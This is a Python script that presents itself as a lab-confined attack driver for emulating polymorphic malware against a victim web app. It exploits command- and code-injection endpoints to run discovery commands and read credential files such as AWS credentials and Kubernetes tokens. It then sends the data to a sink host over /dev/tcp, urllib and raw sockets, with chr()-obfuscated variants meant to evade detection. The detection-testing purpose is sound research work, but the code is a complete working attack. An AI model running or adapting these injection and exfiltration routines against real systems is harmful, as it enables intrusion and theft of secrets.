# Lab-confined attack driver. Replays ONE kill-chain objective through MANY syntactic variants,
# to emulate polymorphic / AI-generated malware (same behavior, different code). All traffic stays
# on the internal lab network; all "secrets" are fake. The attacker's foothold is the victim's
# own injection endpoints, so every attack action runs inside the victim cgroup.
import base64, json, random, sys, time, urllib.parse, urllib.request

VICTIM = 'http://victim:8000'
SINK_IP = sys.argv[1]            # lab sink address, the "exfil" destination
N = int(sys.argv[2])             # number of variants
seed = int(sys.argv[3]); R = random.Random(seed)

SECRETS = ['/app/.env', '/root/.aws/credentials', '/var/run/secrets/kubernetes.io/serviceaccount/token']
DISCOVER = ['id', 'uname -a', 'env', 'cat /etc/passwd', 'hostname', 'cat /proc/self/cgroup']

def sh(cmd):   # via command-injection endpoint -> spawns /bin/sh child of victim
    urllib.request.urlopen(VICTIM + '/debug?cmd=' + urllib.parse.quote(cmd), timeout=30).read()
def py(expr):  # via code-injection endpoint -> runs inside the victim interpreter, no new exec
    urllib.request.urlopen(VICTIM + '/calc?expr=' + urllib.parse.quote(expr), timeout=30).read()

def read_secret_variants(path):
    # many ways to read one secret file -> same behavior (open of a secret path), different code
    return [
        lambda: sh(f'cat {path}'),
        lambda: sh(f'head -c 400 {path}'),
        lambda: sh(f'dd if={path} bs=1 count=400 2>/dev/null'),
        lambda: sh(f'while read l; do echo $l; done < {path}'),
        lambda: sh(f'base64 {path}'),
        lambda: sh(f'xxd {path} 2>/dev/null || od -c {path}'),
        lambda: py(f"open({path!r}).read()"),
        lambda: py(f"__import__('pathlib').Path({path!r}).read_text()"),
    ]

def discover_variants():
    return [lambda c=c: sh(c) for c in DISCOVER] + [
        lambda: py("__import__('os').getuid()"),
        lambda: py("__import__('os').uname()"),
        lambda: py("dict(__import__('os').environ)"),
    ]

def exfil_variants(blob):
    b64 = base64.b64encode(blob.encode()).decode()
    url = f'http://{SINK_IP}:8080/x'
    return [
        lambda: sh(f'echo {b64} | base64 -d > /tmp/.s; cat /tmp/.s > /dev/tcp/{SINK_IP}/8080 || python3 -c "import urllib.request as u;u.urlopen(u.Request({url!r},data=open(chr(47)+chr(116)+chr(109)+chr(112)+chr(47)+chr(46)+chr(115),chr(114)+chr(98)).read()))"'),
        lambda: py(f"__import__('urllib.request',fromlist=['x']).urlopen(__import__('urllib.request',fromlist=['x']).Request({url!r},data={blob.encode()!r}))"),
        lambda: py(f"__import__('socket').create_connection(({SINK_IP!r},8080)).sendall({('POST /x HTTP/1.0\\r\\nHost:x\\r\\nContent-Length:'+str(len(blob))+'\\r\\n\\r\\n'+blob).encode()!r})"),
        lambda: sh(f'python3 -c "import urllib.request as u;u.urlopen(u.Request({url!r},data=b{b64!r}))"'),
    ]

def run_variant(i):
    path = R.choice(SECRETS)
    steps = []
    # realistic kill chain with per-variant shuffling of independent stages
    if R.random() < 0.8:
        for _ in range(R.randint(1, 3)): steps.append(R.choice(discover_variants()))
    steps.append(R.choice(read_secret_variants(path)))
    if R.random() < 0.5: steps.append(R.choice(read_secret_variants(R.choice(SECRETS))))
    loot = f'LOOT-{i}-FAKE-SECRET-' + base64.b64encode(bytes(R.randint(0,255) for _ in range(24))).decode()
    steps.append(R.choice(exfil_variants(loot)))
    t0 = time.monotonic_ns()
    for s in steps:
        try: s()
        except Exception as e: print('variant', i, 'step err', repr(e)[:80], file=sys.stderr)
        time.sleep(R.uniform(0.05, 0.4))  # agent-paced bursts
    print(json.dumps({'variant': i, 'secret': path, 'steps': len(steps), 't_start_ns': t0, 't_end_ns': time.monotonic_ns()}))

for i in range(N):
    run_variant(i)
    time.sleep(R.uniform(0.5, 1.5))
